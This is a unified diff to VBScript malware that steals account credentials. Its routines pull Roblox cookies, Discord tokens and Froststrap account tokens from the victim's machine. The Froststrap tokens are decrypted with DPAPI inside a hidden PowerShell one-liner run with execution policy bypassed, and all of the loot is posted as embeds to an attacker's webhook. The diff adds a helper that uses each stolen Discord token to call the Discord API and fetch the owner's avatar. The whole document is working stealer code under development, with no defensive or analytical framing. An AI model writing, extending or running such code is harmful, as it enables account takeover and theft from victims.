@@ -123,7 +123,6 @@ Sub GrabRoblox()
     Dim warn: warn = InStr(cookie, "_|WARNING")
     If warn > 1 Then cookie = Mid(cookie, warn)
 
-    ' Call helper to get avatar
     Dim info: info = GetRobloxInfoFromCookie(cookie)
     
     PostEmbedWithThumb "Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & info, 65280, GetAvatarUrlFromCookie(cookie)
@@ -143,11 +142,8 @@ Sub GrabFroststrap()
 
     Call PostEmbed(":snowflake: Froststrap", "Froststrap found, grabbing accounts...", 3447003)
 
-    ' We will grab the first account's ID for the thumbnail
-    Dim firstUserId: firstUserId = ""
-    
     Dim ps
-    ps = "$w='" & WH & "';Add-Type -AssemblyName System.Security;$p=Join-Path $env:LOCALAPPDATA 'Froststrap\Cache\AccountManager.json';if(!(Test-Path $p)){try{$r=Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap' -ErrorAction Stop;$p=Join-Path $r.InstallLocation 'Cache\AccountManager.json'}catch{}};if(!(Test-Path $p)){exit};$j=Get-Content $p -Raw|ConvertFrom-Json;$e=[Text.Encoding]::UTF8.GetBytes('Froststrap_DPAPI_v1');$lines=@();foreach($a in $j.accounts){try{$eb=[Convert]::FromBase64String($a.SecurityToken);$db=[Security.Cryptography.ProtectedData]::Unprotect($eb,$e,[Security.DataProtectionScope]::CurrentUser);$c=[Text.Encoding]::UTF8.GetString($db)}catch{$c='DECRYPT FAILED'};$lines+='**'+$a.Username+'** ['+$a.UserId+'] : '+$c};$desc=($lines -join [char]10);if($desc.Length -eq 0){$desc='No accounts found'};$payload=@{embeds=@(@{title=':snowflake: Froststrap Accounts';description=$desc;color=3447003})}|ConvertTo-Json -Depth 4 -Compress;Invoke-RestMethod $w -Method Post -Body $payload -ContentType 'application/json'"
+    ps = "$w='" & WH & "';Add-Type -AssemblyName System.Security;$p=Join-Path $env:LOCALAPPDATA 'Froststrap\Cache\AccountManager.json';if(!(Test-Path $p)){try{$r=Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap' -ErrorAction Stop;$p=Join-Path $r.InstallLocation 'Cache\AccountManager.json'}catch{}};if(!(Test-Path $p)){exit};$j=Get-Content $p -Raw|ConvertFrom-Json;$e=[Text.Encoding]::UTF8.GetBytes('Froststrap_DPAPI_v1');$lines=@();foreach($a in $j.accounts){try{$eb=[Convert]::FromBase64String($a.SecurityToken);$db=[System.Security.Cryptography.ProtectedData]::Unprotect($eb,$e,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);$c=[Text.Encoding]::UTF8.GetString($db)}catch{$c='DECRYPT FAILED'};$lines+='**'+$a.Username+'** ['+$a.UserId+'] : '+$c};$desc=($lines -join [char]10);if($desc.Length -eq 0){$desc='No accounts found'};$payload=@{embeds=@(@{title=':snowflake: Froststrap Accounts';description=$desc;color=3447003})}|ConvertTo-Json -Depth 4 -Compress;Invoke-RestMethod $w -Method Post -Body $payload -ContentType 'application/json'"
 
     sh.Run "powershell -NoP -Exec Bypass -Command """ & ps & """", 0, True
 End Sub
@@ -213,6 +209,23 @@ Function GetAvatarUrlFromCookie(cookie)
     Set xh = Nothing
 End Function
 
+' --- Helper to get Discord Avatar ---
+Function GetDiscordAvatar(token)
+    GetDiscordAvatar = ""
+    Dim psCmd
+    psCmd = "$h=@{Authorization='" & token & "'};try{$r=Invoke-RestMethod -Uri 'https://discord.com/api/v10/users/@me' -Headers $h -TimeoutSec 5 -ErrorAction Stop;if($r.avatar){$ext='png';if($r.avatar.StartsWith('a_')){$ext='gif'};Write-Output ('https://cdn.discordapp.com/avatars/'+$r.id+'/'+$r.avatar+'.'+$ext)}}catch{}"
+    
+    Dim tmpFile: tmpFile = TmpFile("dc_av.txt")
+    fso.DeleteFile tmpFile, True
+    
+    sh.Run "powershell -NoP -Exec Bypass -Command """ & psCmd & " | Out-File -FilePath '" & tmpFile & "' -Encoding ascii -NoNewline""", 0, True
+    
+    If fso.FileExists(tmpFile) Then
+        GetDiscordAvatar = ReadFile(tmpFile)
+        fso.DeleteFile tmpFile, True
+    End If
+End Function
+
 ' --- Simple JSON Extractor ---
 Function ExtractJson(json, key)
     Dim pat: pat = """" & key & """:"
@@ -220,7 +233,6 @@ Function ExtractJson(json, key)
     If pos = 0 Then ExtractJson = "" : Exit Function
     pos = pos + Len(pat)
     
-    ' Skip whitespace
     Do While Mid(json, pos, 1) = " "
         pos = pos + 1
     Loop
@@ -338,8 +350,9 @@ Sub GrabTokens()
                         If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
                         If p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
                         info = info & "**Token:** " & p(4)
-                        ' For discord tokens, we can try to get their avatar but it requires an API call. We will just use the default embed.
-                        Call PostEmbed(":gift: Discord Token", info, 5793266)
+                        
+                        Dim avUrlDc: avUrlDc = GetDiscordAvatar(p(4))
+                        Call PostEmbedWithThumb(":gift: Discord Token", info, 5793266, avUrlDc)
                     End If
                 End If
                 If Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
